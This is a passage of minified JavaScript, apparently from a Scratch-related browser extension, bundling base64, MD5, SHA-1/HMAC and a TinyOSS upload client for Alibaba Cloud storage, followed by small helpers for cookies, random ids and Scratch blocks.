(function anonymous(extid, CommunityEnhanced) {
    var Ze = Object.create
      , Be = Object.defineProperty
      , Me = Object.getOwnPropertyDescriptor
      , et = Object.getOwnPropertyNames
      , tt = Object.getPrototypeOf
      , nt = Object.prototype.hasOwnProperty
      , rt = (e,t)=>()=>(t || e((t = {
        exports: {}
    }).exports, t),
    t.exports)
      , it = (t,n,r,i)=>{
        if (n && "object" == typeof n || "function" == typeof n)
            for (let e of et(n))
                nt.call(t, e) || e === r || Be(t, e, {
                    get: ()=>n[e],
                    enumerable: !(i = Me(n, e)) || i.enumerable
                });
        return t
    }
      , ot = (e,t,n)=>(n = null != e ? Ze(tt(e)) : {},
    it(!t && e && e.__esModule ? n : Be(n, "default", {
        value: e,
        enumerable: !0
    }), e))
      , Ie = rt((e,t)=>{
        var n, r;
        n = window,
        r = function() {
            return n = [function(e, t, n) {
                t.byteLength = function(e) {
                    var e = l(e)
                      , t = e[0]
                      , e = e[1];
                    return 3 * (t + e) / 4 - e
                }
                ,
                t.toByteArray = function(e) {
                    for (var t, n = l(e), r = n[0], n = n[1], i = new u(3 * (r + n) / 4 - n), o = 0, s = 0 < n ? r - 4 : r, c = 0; c < s; c += 4)
                        t = a[e.charCodeAt(c)] << 18 | a[e.charCodeAt(c + 1)] << 12 | a[e.charCodeAt(c + 2)] << 6 | a[e.charCodeAt(c + 3)],
                        i[o++] = t >> 16 & 255,
                        i[o++] = t >> 8 & 255,
                        i[o++] = 255 & t;
                    return 2 === n && (t = a[e.charCodeAt(c)] << 2 | a[e.charCodeAt(c + 1)] >> 4,
                    i[o++] = 255 & t),
                    1 === n && (t = a[e.charCodeAt(c)] << 10 | a[e.charCodeAt(c + 1)] << 4 | a[e.charCodeAt(c + 2)] >> 2,
                    i[o++] = t >> 8 & 255,
                    i[o++] = 255 & t),
                    i
                }
                ,
                t.fromByteArray = function(e) {
                    for (var t, n = e.length, r = n % 3, i = [], o = 0, s = n - r; o < s; o += 16383)
                        i.push(((e,t,n)=>{
                            for (var r, i = [], o = t; o < n; o += 3)
                                r = (e[o] << 16 & 16711680) + (e[o + 1] << 8 & 65280) + (255 & e[o + 2]),
                                i.push(c[(r = r) >> 18 & 63] + c[r >> 12 & 63] + c[r >> 6 & 63] + c[63 & r]);
                            return i.join("")
                        }
                        )(e, o, s < o + 16383 ? s : o + 16383));
                    return 1 == r ? (t = e[n - 1],
                    i.push(c[t >> 2] + c[t << 4 & 63] + "==")) : 2 == r && (t = (e[n - 2] << 8) + e[n - 1],
                    i.push(c[t >> 10] + c[t >> 4 & 63] + c[t << 2 & 63] + "=")),
                    i.join("")
                }
                ;
                for (var c = [], a = [], u = typeof Uint8Array < "u" ? Uint8Array : Array, r = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", i = 0, o = r.length; i < o; ++i)
                    c[i] = r[i],
                    a[r.charCodeAt(i)] = i;
                function l(e) {
                    var t = e.length;
                    if (0 < t % 4)
                        throw new Error("Invalid string. Length must be a multiple of 4");
                    e = e.indexOf("=");
                    return [e = -1 === e ? t : e, e === t ? 0 : 4 - e % 4]
                }
                a[45] = 62,
                a[95] = 63
            }
            , function(e, t) {
                var n = {
                    utf8: {
                        stringToBytes: function(e) {
                            return n.bin.stringToBytes(unescape(encodeURIComponent(e)))
                        },
                        bytesToString: function(e) {
                            return decodeURIComponent(escape(n.bin.bytesToString(e)))
                        }
                    },
                    bin: {
                        stringToBytes: function(e) {
                            for (var t = [], n = 0; n < e.length; n++)
                                t.push(255 & e.charCodeAt(n));
                            return t
                        },
                        bytesToString: function(e) {
                            for (var t = [], n = 0; n < e.length; n++)
                                t.push(String.fromCharCode(e[n]));
                            return t.join("")
                        }
                    }
                };
                e.exports = n
            }
            , function(e, t, n) {
                var a = Object.getOwnPropertySymbols
                  , u = Object.prototype.hasOwnProperty
                  , l = Object.prototype.propertyIsEnumerable;
                e.exports = (()=>{
                    try {
                        if (Object.assign) {
                            var e = new String("abc");
                            if (e[5] = "de",
                            "5" !== Object.getOwnPropertyNames(e)[0]) {
                                for (var t, n = {}, r = 0; r < 10; r++)
                                    n["_" + String.fromCharCode(r)] = r;
                                if ("0123456789" === Object.getOwnPropertyNames(n).map(function(e) {
                                    return n[e]
                                }).join(""))
                                    return t = {},
                                    "abcdefghijklmnopqrst".split("").forEach(function(e) {
                                        t[e] = e
                                    }),
                                    "abcdefghijklmnopqrst" === Object.keys(Object.assign({}, t)).join("")
                            }
                        }
                    } catch {}
                }
                )() ? Object.assign : function(e, t) {
                    for (var n, r = (e=>{
                        if (null == e)
                            throw new TypeError("Object.assign cannot be called with null or undefined");
                        return Object(e)
                    }
                    )(e), i = 1; i < arguments.length; i++) {
                        for (var o in n = Object(arguments[i]))
                            u.call(n, o) && (r[o] = n[o]);
                        if (a)
                            for (var s = a(n), c = 0; c < s.length; c++)
                                l.call(n, s[c]) && (r[s[c]] = n[s[c]])
                    }
                    return r
                }
            }
            , function(e, t, n) {
                var m, g = n(6), b = n(1).utf8, v = n(7), w = n(1).bin;
                (m = function(e, t) {
                    e.constructor == String ? e = (t && "binary" === t.encoding ? w : b).stringToBytes(e) : v(e) ? e = Array.prototype.slice.call(e, 0) : Array.isArray(e) || e.constructor === Uint8Array || (e = e.toString());
                    for (var n = g.bytesToWords(e), t = 8 * e.length, r = 1732584193, i = -271733879, o = -1732584194, s = 271733878, c = 0; c < n.length; c++)
                        n[c] = 16711935 & (n[c] << 8 | n[c] >>> 24) | 4278255360 & (n[c] << 24 | n[c] >>> 8);
                    n[t >>> 5] |= 128 << t % 32,
                    n[14 + (64 + t >>> 9 << 4)] = t;
                    for (var a = m._ff, u = m._gg, l = m._hh, d = m._ii, c = 0; c < n.length; c += 16) {
                        var h = r
                          , p = i
                          , f = o
                          , y = s
                          , r = a(r, i, o, s, n[c + 0], 7, -680876936)
                          , s = a(s, r, i, o, n[c + 1], 12, -389564586)
                          , o = a(o, s, r, i, n[c + 2], 17, 606105819)
                          , i = a(i, o, s, r, n[c + 3], 22, -1044525330);
                        r = a(r, i, o, s, n[c + 4], 7, -176418897),
                        s = a(s, r, i, o, n[c + 5], 12, 1200080426),
                        o = a(o, s, r, i, n[c + 6], 17, -1473231341),
                        i = a(i, o, s, r, n[c + 7], 22, -45705983),
                        r = a(r, i, o, s, n[c + 8], 7, 1770035416),
                        s = a(s, r, i, o, n[c + 9], 12, -1958414417),
                        o = a(o, s, r, i, n[c + 10], 17, -42063),
                        i = a(i, o, s, r, n[c + 11], 22, -1990404162),
                        r = a(r, i, o, s, n[c + 12], 7, 1804603682),
                        s = a(s, r, i, o, n[c + 13], 12, -40341101),
                        o = a(o, s, r, i, n[c + 14], 17, -1502002290),
                        r = u(r, i = a(i, o, s, r, n[c + 15], 22, 1236535329), o, s, n[c + 1], 5, -165796510),
                        s = u(s, r, i, o, n[c + 6], 9, -1069501632),
                        o = u(o, s, r, i, n[c + 11], 14, 643717713),
                        i = u(i, o, s, r, n[c + 0], 20, -373897302),
                        r = u(r, i, o, s, n[c + 5], 5, -701558691),
                        s = u(s, r, i, o, n[c + 10], 9, 38016083),
                        o = u(o, s, r, i, n[c + 15], 14, -660478335),
                        i = u(i, o, s, r, n[c + 4], 20, -405537848),
                        r = u(r, i, o, s, n[c + 9], 5, 568446438),
                        s = u(s, r, i, o, n[c + 14], 9, -1019803690),
                        o = u(o, s, r, i, n[c + 3], 14, -187363961),
                        i = u(i, o, s, r, n[c + 8], 20, 1163531501),
                        r = u(r, i, o, s, n[c + 13], 5, -1444681467),
                        s = u(s, r, i, o, n[c + 2], 9, -51403784),
                        o = u(o, s, r, i, n[c + 7], 14, 1735328473),
                        r = l(r, i = u(i, o, s, r, n[c + 12], 20, -1926607734), o, s, n[c + 5], 4, -378558),
                        s = l(s, r, i, o, n[c + 8], 11, -2022574463),
                        o = l(o, s, r, i, n[c + 11], 16, 1839030562),
                        i = l(i, o, s, r, n[c + 14], 23, -35309556),
                        r = l(r, i, o, s, n[c + 1], 4, -1530992060),
                        s = l(s, r, i, o, n[c + 4], 11, 1272893353),
                        o = l(o, s, r, i, n[c + 7], 16, -155497632),
                        i = l(i, o, s, r, n[c + 10], 23, -1094730640),
                        r = l(r, i, o, s, n[c + 13], 4, 681279174),
                        s = l(s, r, i, o, n[c + 0], 11, -358537222),
                        o = l(o, s, r, i, n[c + 3], 16, -722521979),
                        i = l(i, o, s, r, n[c + 6], 23, 76029189),
                        r = l(r, i, o, s, n[c + 9], 4, -640364487),
                        s = l(s, r, i, o, n[c + 12], 11, -421815835),
                        o = l(o, s, r, i, n[c + 15], 16, 530742520),
                        r = d(r, i = l(i, o, s, r, n[c + 2], 23, -995338651), o, s, n[c + 0], 6, -198630844),
                        s = d(s, r, i, o, n[c + 7], 10, 1126891415),
                        o = d(o, s, r, i, n[c + 14], 15, -1416354905),
                        i = d(i, o, s, r, n[c + 5], 21, -57434055),
                        r = d(r, i, o, s, n[c + 12], 6, 1700485571),
                        s = d(s, r, i, o, n[c + 3], 10, -1894986606),
                        o = d(o, s, r, i, n[c + 10], 15, -1051523),
                        i = d(i, o, s, r, n[c + 1], 21, -2054922799),
                        r = d(r, i, o, s, n[c + 8], 6, 1873313359),
                        s = d(s, r, i, o, n[c + 15], 10, -30611744),
                        o = d(o, s, r, i, n[c + 6], 15, -1560198380),
                        i = d(i, o, s, r, n[c + 13], 21, 1309151649),
                        r = d(r, i, o, s, n[c + 4], 6, -145523070),
                        s = d(s, r, i, o, n[c + 11], 10, -1120210379),
                        o = d(o, s, r, i, n[c + 2], 15, 718787259),
                        i = d(i, o, s, r, n[c + 9], 21, -343485551),
                        r = r + h >>> 0,
                        i = i + p >>> 0,
                        o = o + f >>> 0,
                        s = s + y >>> 0
                    }
                    return g.endian([r, i, o, s])
                }
                )._ff = function(e, t, n, r, i, o, s) {
                    e = e + (t & n | ~t & r) + (i >>> 0) + s;
                    return (e << o | e >>> 32 - o) + t
                }
                ,
                m._gg = function(e, t, n, r, i, o, s) {
                    e = e + (t & r | n & ~r) + (i >>> 0) + s;
                    return (e << o | e >>> 32 - o) + t
                }
                ,
                m._hh = function(e, t, n, r, i, o, s) {
                    e = e + (t ^ n ^ r) + (i >>> 0) + s;
                    return (e << o | e >>> 32 - o) + t
                }
                ,
                m._ii = function(e, t, n, r, i, o, s) {
                    e = e + (n ^ (t | ~r)) + (i >>> 0) + s;
                    return (e << o | e >>> 32 - o) + t
                }
                ,
                m._blocksize = 16,
                m._digestsize = 16,
                e.exports = function(e, t) {
                    if (null == e)
                        throw new Error("Illegal argument " + e);
                    e = g.wordsToBytes(m(e, t));
                    return t && t.asBytes ? e : t && t.asString ? w.bytesToString(e) : g.bytesToHex(e)
                }
            }
            , function(e, t, n) {
                function r() {}
                function a(e) {
                    if (e.constructor !== Uint8Array) {
                        if (e.constructor === ArrayBuffer)
                            return new Uint8Array(e);
                        if (e.constructor === String) {
                            for (var t = e, n = new ArrayBuffer(t.length), r = new Uint8Array(n), i = 0; i < t.length; i++)
                                r[i] = t.charCodeAt(i);
                            return r
                        }
                        if (e.constructor !== Number)
                            throw "Unsupported type";
                        if (255 < e)
                            throw "For more than one byte, use an array buffer";
                        if (e < 0)
                            throw "Input value must be positive";
                        n = e,
                        e = new ArrayBuffer(1),
                        (e = new Uint8Array(e))[0] = n
                    }
                    return e
                }
                function i(t) {
                    function n(e) {
                        for (var t = e.length, n = 0; 0 < t; ) {
                            var r = this.blockLen - this.inLen
                              , i = (t < r && (r = t),
                            e.subarray(n, n + r));
                            this.inbuf.set(i, this.inLen),
                            n += r,
                            t -= r,
                            this.inLen += r,
                            this.inLen === this.blockLen && (this.processBlock(this.inbuf),
                            this.inLen = 0)
                        }
                    }
                    function r() {
                        var e = this.doPadding()
                          , e = (this.update(e),
                        this.getDigest());
                        return this.reset(),
                        e
                    }
                    var i = (()=>{
                        if (!t)
                            throw "Unsupported algorithm: " + t.toString();
                        t.prototype.update = n,
                        t.prototype.finalize = r;
                        var e = new t;
                        return e.inbuf = new Uint8Array(new ArrayBuffer(e.blockLen)),
                        e.reset(),
                        e
                    }
                    )();
                    return {
                        update: function(e) {
                            i.update(a(e))
                        },
                        finalize: function() {
                            return i.finalize()
                        },
                        digest: function(e) {
                            return i.update(a(e)),
                            i.finalize()
                        },
                        reset: function() {
                            i.reset()
                        },
                        digestLength: function() {
                            return i.digestLen
                        }
                    }
                }
                function o(r) {
                    function t() {
                        c = !1,
                        s = o = i = void 0,
                        r.reset()
                    }
                    var i, o, s, c = !1;
                    return {
                        setKey: function(e) {
                            var t, n;
                            if (e = a(e),
                            i = e,
                            !c) {
                                if (void 0 === i)
                                    throw "MAC key is not defined";
                                for (n = 64 < i.byteLength ? new Uint8Array(r.digest(i)) : new Uint8Array(i),
                                o = new Uint8Array(new ArrayBuffer(64)),
                                t = 0; t < n.length; t++)
                                    o[t] = 54 ^ n[t];
                                for (t = n.length; t < 64; t++)
                                    o[t] = 54;
                                for (s = new Uint8Array(new ArrayBuffer(64)),
                                t = 0; t < n.length; t++)
                                    s[t] = 92 ^ n[t];
                                for (t = n.length; t < 64; t++)
                                    s[t] = 92;
                                c = !0,
                                r.update(o.buffer)
                            }
                        },
                        update: function(e) {
                            r.update(e)
                        },
                        finalize: function() {
                            return e = r.finalize(),
                            r.reset(),
                            r.update(s.buffer),
                            r.update(e),
                            e = r.finalize(),
                            t(),
                            e;
                            var e
                        },
                        mac: function(e) {
                            return this.update(e),
                            this.finalize()
                        },
                        reset: function() {
                            t()
                        },
                        hmacLength: function() {
                            return r.digestLength()
                        }
                    }
                }
                ArrayBuffer.prototype.slice || (ArrayBuffer.prototype.slice = function(e, t) {
                    for (var n = new Uint8Array(this), t = (void 0 === t && (t = n.length),
                    new ArrayBuffer(t - e)), r = new Uint8Array(t), i = 0; i < r.length; i++)
                        r[i] = n[i + e];
                    return t
                }
                ),
                r.prototype.processBlock = function(e) {
                    for (var t, n = this.current[0], r = this.current[1], i = this.current[2], o = this.current[3], s = this.current[4], c = [e[0] << 24 | e[1] << 16 | e[2] << 8 | e[3], e[4] << 24 | e[5] << 16 | e[6] << 8 | e[7], e[8] << 24 | e[9] << 16 | e[10] << 8 | e[11], e[12] << 24 | e[13] << 16 | e[14] << 8 | e[15], e[16] << 24 | e[17] << 16 | e[18] << 8 | e[19], e[20] << 24 | e[21] << 16 | e[22] << 8 | e[23], e[24] << 24 | e[25] << 16 | e[26] << 8 | e[27], e[28] << 24 | e[29] << 16 | e[30] << 8 | e[31], e[32] << 24 | e[33] << 16 | e[34] << 8 | e[35], e[36] << 24 | e[37] << 16 | e[38] << 8 | e[39], e[40] << 24 | e[41] << 16 | e[42] << 8 | e[43], e[44] << 24 | e[45] << 16 | e[46] << 8 | e[47], e[48] << 24 | e[49] << 16 | e[50] << 8 | e[51], e[52] << 24 | e[53] << 16 | e[54] << 8 | e[55], e[56] << 24 | e[57] << 16 | e[58] << 8 | e[59], e[60] << 24 | e[61] << 16 | e[62] << 8 | e[63]], a = 16; a < 80; a++)
                        c.push((c[a - 3] ^ c[a - 8] ^ c[a - 14] ^ c[a - 16]) << 1 | (c[a - 3] ^ c[a - 8] ^ c[a - 14] ^ c[a - 16]) >>> 31);
                    for (a = 0; a < 80; a++)
                        t = (n << 5 | n >>> 27) + s + c[a],
                        t += a < 20 ? 1518500249 + (r & i | ~r & o) | 0 : a < 40 ? 1859775393 + (r ^ i ^ o) | 0 : a < 60 ? 2400959708 + (r & i | r & o | i & o) | 0 : 3395469782 + (r ^ i ^ o) | 0,
                        s = o,
                        o = i,
                        i = r << 30 | r >>> 2,
                        r = n,
                        n = t;
                    this.current[0] += n,
                    this.current[1] += r,
                    this.current[2] += i,
                    this.current[3] += o,
                    this.current[4] += s,
                    this.currentLen += 64
                }
                ,
                r.prototype.doPadding = function() {
                    var e = 4294967295 & 8 * (this.inLen + this.currentLen)
                      , t = this.inLen <= 55 ? 55 - this.inLen : 119 - this.inLen
                      , t = new Uint8Array(new ArrayBuffer(1 + t + 8));
                    return t[0] = 128,
                    t[t.length - 1] = 255 & e,
                    t[t.length - 2] = e >>> 8 & 255,
                    t[t.length - 3] = e >>> 16 & 255,
                    t[t.length - 4] = e >>> 24 & 255,
                    t[t.length - 5] = 0,
                    t[t.length - 6] = 0,
                    t[t.length - 7] = 0,
                    t[t.length - 8] = 0,
                    t
                }
                ,
                r.prototype.getDigest = function() {
                    var e = new Uint8Array(new ArrayBuffer(20));
                    return e[3] = 255 & this.current[0],
                    e[2] = this.current[0] >>> 8 & 255,
                    e[1] = this.current[0] >>> 16 & 255,
                    e[0] = this.current[0] >>> 24 & 255,
                    e[7] = 255 & this.current[1],
                    e[6] = this.current[1] >>> 8 & 255,
                    e[5] = this.current[1] >>> 16 & 255,
                    e[4] = this.current[1] >>> 24 & 255,
                    e[11] = 255 & this.current[2],
                    e[10] = this.current[2] >>> 8 & 255,
                    e[9] = this.current[2] >>> 16 & 255,
                    e[8] = this.current[2] >>> 24 & 255,
                    e[15] = 255 & this.current[3],
                    e[14] = this.current[3] >>> 8 & 255,
                    e[13] = this.current[3] >>> 16 & 255,
                    e[12] = this.current[3] >>> 24 & 255,
                    e[19] = 255 & this.current[4],
                    e[18] = this.current[4] >>> 8 & 255,
                    e[17] = this.current[4] >>> 16 & 255,
                    e[16] = this.current[4] >>> 24 & 255,
                    e.buffer
                }
                ,
                r.prototype.reset = function() {
                    this.currentLen = 0,
                    this.inLen = 0,
                    this.current = new Uint32Array(new ArrayBuffer(20)),
                    this.current[0] = 1732584193,
                    this.current[1] = 4023233417,
                    this.current[2] = 2562383102,
                    this.current[3] = 271733878,
                    this.current[4] = 3285377520
                }
                ,
                r.prototype.blockLen = 64,
                r.prototype.digestLen = 20,
                e.exports && (e.exports = {
                    SHA1: function() {
                        return i(r)
                    },
                    HMAC_SHA1: function() {
                        return o(i(r))
                    }
                })
            }
            , function(e, t, n) {
                e.exports = n(8).default
            }
            , function(e, t) {
                var o = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
                  , n = {
                    rotl: function(e, t) {
                        return e << t | e >>> 32 - t
                    },
                    rotr: function(e, t) {
                        return e << 32 - t | e >>> t
                    },
                    endian: function(e) {
                        if (e.constructor == Number)
                            return 16711935 & n.rotl(e, 8) | 4278255360 & n.rotl(e, 24);
                        for (var t = 0; t < e.length; t++)
                            e[t] = n.endian(e[t]);
                        return e
                    },
                    randomBytes: function(e) {
                        for (var t = []; 0 < e; e--)
                            t.push(Math.floor(256 * Math.random()));
                        return t
                    },
                    bytesToWords: function(e) {
                        for (var t = [], n = 0, r = 0; n < e.length; n++,
                        r += 8)
                            t[r >>> 5] |= e[n] << 24 - r % 32;
                        return t
                    },
                    wordsToBytes: function(e) {
                        for (var t = [], n = 0; n < 32 * e.length; n += 8)
                            t.push(e[n >>> 5] >>> 24 - n % 32 & 255);
                        return t
                    },
                    bytesToHex: function(e) {
                        for (var t = [], n = 0; n < e.length; n++)
                            t.push((e[n] >>> 4).toString(16)),
                            t.push((15 & e[n]).toString(16));
                        return t.join("")
                    },
                    hexToBytes: function(e) {
                        for (var t = [], n = 0; n < e.length; n += 2)
                            t.push(parseInt(e.substr(n, 2), 16));
                        return t
                    },
                    bytesToBase64: function(e) {
                        for (var t = [], n = 0; n < e.length; n += 3)
                            for (var r = e[n] << 16 | e[n + 1] << 8 | e[n + 2], i = 0; i < 4; i++)
                                8 * n + 6 * i <= 8 * e.length ? t.push(o.charAt(r >>> 6 * (3 - i) & 63)) : t.push("=");
                        return t.join("")
                    },
                    base64ToBytes: function(e) {
                        e = e.replace(/[^A-Z0-9+\/]/gi, "");
                        for (var t = [], n = 0, r = 0; n < e.length; r = ++n % 4)
                            0 != r && t.push((o.indexOf(e.charAt(n - 1)) & Math.pow(2, -2 * r + 8) - 1) << 2 * r | o.indexOf(e.charAt(n)) >>> 6 - 2 * r);
                        return t
                    }
                };
                e.exports = n
            }
            , function(e, t) {
                function n(e) {
                    return !!e.constructor && "function" == typeof e.constructor.isBuffer && e.constructor.isBuffer(e)
                }
                e.exports = function(e) {
                    return null != e && (n(e) || "function" == typeof (t = e).readFloatLE && "function" == typeof t.slice && n(t.slice(0, 0)) || !!e._isBuffer);
                    var t
                }
            }
            , function(e, t, n) {
                n.r(t),
                n.d(t, "default", function() {
                    return i
                });
                var t = n(2)
                  , o = n.n(t);
                function l(d, h) {
                    return void 0 === h && (h = {}),
                    new Promise(function(t, n) {
                        var r, e = h, i = e.async, i = void 0 === i || i, o = e.data, o = void 0 === o ? null : o, s = e.headers, c = void 0 === s ? {} : s, s = e.method, s = void 0 === s ? "get" : s, a = e.timeout, u = void 0 === a ? 0 : a, a = e.onprogress, l = new XMLHttpRequest;
                        u && (r = setTimeout(function() {
                            n(new Error("the request timeout " + u + "ms"))
                        }, u)),
                        l.onerror = function() {
                            n(new Error("unknown error"))
                        }
                        ,
                        l.upload && (l.upload.onprogress = a),
                        l.onreadystatechange = function() {
                            var e;
                            4 === l.readyState && (u && clearTimeout(r),
                            200 <= l.status && l.status < 300 ? t(l.response, l) : (e = new Error("the request is error"),
                            n(e)))
                        }
                        ,
                        l.open(s, d, i),
                        Object.keys(c).forEach(function(e) {
                            l.setRequestHeader(e, c[e])
                        });
                        try {
                            l.send(o)
                        } catch (e) {
                            n(e)
                        }
                    }
                    )
                }
                var t = n(3)
                  , r = n.n(t)
                  , t = n(0)
                  , y = n.n(t)
                  , t = n(4)
                  , m = n.n(t);
                function g(e) {
                    var t;
                    return (e = t = e ? new Date(e) : t) && "[object Date]" === Object.prototype.toString.call(e) && "Invalid Date" !== e.toString || (t = new Date),
                    Math.round(t.getTime() / 1e3)
                }
                function d(e) {
                    e = Array.prototype.slice.call(e, 0),
                    e = (e=>{
                        for (var t = [], n = 0; n < e.length; n += 2)
                            t.push(parseInt(e[n] + e[n + 1], 16));
                        return Uint8Array.from(t)
                    }
                    )(r()(e));
                    return y.a.fromByteArray(e)
                }
                function p(e) {
                    var t, n, r, i, o, e = e = void 0 === e ? {} : e, s = e.type, s = void 0 === s ? "header" : s, c = e.verb, c = void 0 === c ? "" : c, a = e.contentMd5, a = void 0 === a ? "" : a, u = e.expires, u = void 0 === u ? g() + 3600 : u, l = e.bucket, d = e.objectName, h = e.accessKeySecret, p = e.headers, p = void 0 === p ? {} : p, e = e.subResource, f = p["x-oss-date"] || "", c = [c, a, p["Content-Type"] || ""], s = (c.push("header" === s ? f : u),
                    i = p,
                    o = "",
                    (a = (a = Object.keys(i)).map(function(e) {
                        return e.toLowerCase()
                    })).sort(),
                    a.forEach(function(e) {
                        0 === e.indexOf("x-oss-") && (o += e + ":" + i[e] + `
`)
                    }),
                    o), a = (t = e,
                    f = "",
                    (u = void 0 === (u = l) ? "" : l) && (f += "/" + u),
                    (p = void 0 === (p = d) ? "" : p) && ("/" !== p.charAt(0) && (f += "/"),
                    f += p),
                    n = "" + f,
                    r = "?",
                    t && Object.keys(t).sort(function(e, t) {
                        return e[0] > t[0] ? 1 : e[0] < t[0] ? -1 : 0
                    }).forEach(function(e) {
                        n += r + e,
                        t[e] && (n += "=" + t[e]),
                        r = "&"
                    }),
                    n), e = (c.push("" + s + a),
                    c.join(`
`)), l = new m.a.HMAC_SHA1, u = (l.setKey(h),
                    l.update(e),
                    new Uint8Array(l.finalize()));
                    return y.a.fromByteArray(u)
                }
                (n = s.prototype).put = function(s, c, a) {
                    var u = this;
                    return void 0 === a && (a = {}),
                    new Promise(function(e, t) {
                        var r;
                        r = c,
                        new Promise(function(t, e) {
                            var n = new FileReader;
                            n.onload = function() {
                                var e = new Uint8Array(n.result);
                                t(e)
                            }
                            ,
                            n.onerror = function() {
                                e(n.error)
                            }
                            ,
                            n.readAsArrayBuffer(r)
                        }
                        ).then(function(e) {
                            var t = u.opts
                              , n = t.accessKeyId
                              , r = t.accessKeySecret
                              , i = t.stsToken
                              , t = t.bucket
                              , e = d(e)
                              , o = {
                                "Content-Md5": e,
                                "Content-Type": c.type,
                                "x-oss-date": (new Date).toGMTString()
                            }
                              , i = (i && (o["x-oss-security-token"] = i),
                            p({
                                verb: "PUT",
                                contentMd5: e,
                                headers: o,
                                bucket: t,
                                objectName: s,
                                accessKeyId: n,
                                accessKeySecret: r
                            }));
                            return o.Authorization = "OSS " + n + ":" + i,
                            l((u.opts.secure ? "https" : "http") + "://" + u.host + "/" + s, {
                                method: "PUT",
                                headers: o,
                                data: c,
                                timeout: u.opts.timeout,
                                onprogress: a.onprogress
                            })
                        }).then(e).catch(t)
                    }
                    )
                }
                ,
                n.putSymlink = function(e, t) {
                    var n = this.opts
                      , r = n.accessKeyId
                      , i = n.accessKeySecret
                      , o = n.stsToken
                      , n = n.bucket
                      , t = {
                        "x-oss-date": (new Date).toGMTString(),
                        "x-oss-symlink-target": encodeURI(t)
                    }
                      , o = (o && (t["x-oss-security-token"] = o),
                    p({
                        verb: "PUT",
                        headers: t,
                        bucket: n,
                        objectName: e,
                        accessKeyId: r,
                        accessKeySecret: i,
                        subResource: {
                            symlink: ""
                        }
                    }));
                    return t.Authorization = "OSS " + r + ":" + o,
                    l((this.opts.secure ? "https" : "http") + "://" + this.host + "/" + e + "?symlink", {
                        method: "PUT",
                        headers: t,
                        timeout: this.opts.timeout
                    })
                }
                ,
                n.signatureUrl = function(e, r) {
                    var t = r = void 0 === r ? {} : r
                      , n = t.expires
                      , n = void 0 === n ? 1800 : n
                      , i = t.method
                      , o = t.process
                      , s = t.response
                      , t = this.opts
                      , c = t.accessKeyId
                      , a = t.accessKeySecret
                      , u = t.stsToken
                      , t = t.bucket
                      , l = {}
                      , d = {}
                      , o = (o && (d["x-oss-process"] = o),
                    s && Object.keys(s).forEach(function(e) {
                        var t = "response-" + e.toLowerCase();
                        d[t] = s[e]
                    }),
                    Object.keys(r).forEach(function(e) {
                        var t = e.toLowerCase()
                          , n = r[e];
                        0 === t.indexOf("x-oss-") ? l[t] = n : 0 === t.indexOf("content-md5") || 0 === t.indexOf("content-type") ? l[e] = n : "expires" !== t && "response" !== t && "process" !== t && "method" !== t && (d[t] = n)
                    }),
                    r["security-token"] || u)
                      , u = (o && (d["security-token"] = o),
                    g() + n)
                      , o = p({
                        type: "url",
                        verb: i || "GET",
                        accessKeyId: c,
                        accessKeySecret: a,
                        bucket: t,
                        objectName: e,
                        headers: l,
                        subResource: d,
                        expires: u
                    })
                      , h = (h = (h = (this.opts.secure ? "https" : "http") + "://" + this.host + "/" + e) + ("?OSSAccessKeyId=" + c) + ("&Expires=" + u)) + ("&Signature=" + encodeURIComponent(o));
                    return Object.keys(d).forEach(function(e) {
                        h += "&" + e + "=" + encodeURIComponent(d[e])
                    }),
                    h
                }
                ;
                var i = s;
                function s(e) {
                    var t = (i = e = void 0 === e ? {} : e).accessKeyId
                      , n = i.accessKeySecret
                      , r = i.bucket
                      , i = i.endpoint;
                    if (!t)
                        throw new Error("need accessKeyId");
                    if (!n)
                        throw new Error("need accessKeySecret");
                    if (!r && !i)
                        throw new Error("need bucket or endpoint");
                    this.opts = o()({
                        region: "oss-cn-hangzhou",
                        internal: !1,
                        cname: !1,
                        secure: !1,
                        timeout: 6e4
                    }, e);
                    var t = this.opts
                      , n = t.bucket
                      , r = t.region
                      , i = t.endpoint
                      , e = t.internal;
                    this.host = "",
                    i ? this.host = i : (t = n,
                    e && (t += "-internal"),
                    this.host = t += "." + r + ".aliyuncs.com")
                }
            }
            ],
            r = {},
            i.m = n,
            i.c = r,
            i.d = function(e, t, n) {
                i.o(e, t) || Object.defineProperty(e, t, {
                    enumerable: !0,
                    get: n
                })
            }
            ,
            i.r = function(e) {
                typeof Symbol < "u" && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
                    value: "Module"
                }),
                Object.defineProperty(e, "__esModule", {
                    value: !0
                })
            }
            ,
            i.t = function(t, e) {
                if (1 & e && (t = i(t)),
                8 & e || 4 & e && "object" == typeof t && t && t.__esModule)
                    return t;
                var n = Object.create(null);
                if (i.r(n),
                Object.defineProperty(n, "default", {
                    enumerable: !0,
                    value: t
                }),
                2 & e && "string" != typeof t)
                    for (var r in t)
                        i.d(n, r, function(e) {
                            return t[e]
                        }
                        .bind(null, r));
                return n
            }
            ,
            i.n = function(e) {
                var t = e && e.__esModule ? function() {
                    return e.default
                }
                : function() {
                    return e
                }
                ;
                return i.d(t, "a", t),
                t
            }
            ,
            i.o = function(e, t) {
                return Object.prototype.hasOwnProperty.call(e, t)
            }
            ,
            i.p = "",
            i(i.s = 5);
            function i(e) {
                var t;
                return (r[e] || (t = r[e] = {
                    i: e,
                    l: !1,
                    exports: {}
                },
                n[e].call(t.exports, t, t.exports, i),
                t.l = !0,
                t)).exports
            }
            var n, r
        }
        ,
        "object" == typeof e && "object" == typeof t ? t.exports = r() : "function" == typeof define && define.amd ? define([], r) : "object" == typeof e ? e.TinyOSS = r() : n.TinyOSS = r()
    }
    );
    function Ee(e, t, n) {
        e[t] && (e[t] = n(e[t]))
    }
    function te(e) {
        return ("; " + document.cookie).split(`; ${e}=`).pop().split(";").shift()
    }
    function pe(e, t) {
        return e <= 0 ? "" : t[Math.floor(Math.random() * t.length)] + pe(e - 1, t)
    }
    function $(e, t=1) {
        return t ? [null, "l", e, {}, null, {}] : {
            blockType: Scratch.BlockType.LABEL,
            text: e
        }
    }
    function ne(e, t="_blank") {
        var n = document.createElement("a");
        n.href = e,
        n.target = t,
        n.click()
    }
    function ye() {
        return [...Array(32)].map(()=>Math.floor(16 * Math.random()).toString(16)).join("")
    }
    function Oe(e, t) {
        for (var n of e)
            for (var r of Object.values(n.blocks._blocks))
                t(r, n)
    }
    function Ae(t, n, e) {
        Oe(e.targets, e=>{
